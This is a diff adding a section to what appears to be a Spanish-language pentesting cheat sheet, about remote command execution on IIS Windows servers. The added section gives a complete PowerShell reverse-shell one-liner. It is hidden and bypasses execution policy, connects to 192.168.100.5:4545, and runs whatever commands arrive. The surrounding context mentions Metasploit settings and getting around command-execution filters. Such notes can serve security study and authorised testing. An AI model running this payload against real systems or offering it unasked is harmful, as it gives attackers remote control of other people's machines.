@@ -68,6 +68,12 @@ set LHOST tu_ip
 set LPORT tu_puerto
 ```
 
+#### RCE en IIS windows
+Teniendo un cuadro de texto donde ejecutar comandos de sistema, nos ponemos a la escucha por el puerto que queramos y ejecutamos esta "linea"
+```bash
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.5',4545); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2  = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()"
+```
+
 ### Filtros command execution
 En ocasiones podemos ejecutar algunos comandos, pero no "bash", "cat" o similares que puedan ser interpretados como una amenaza. Algunas alternativas son:
 
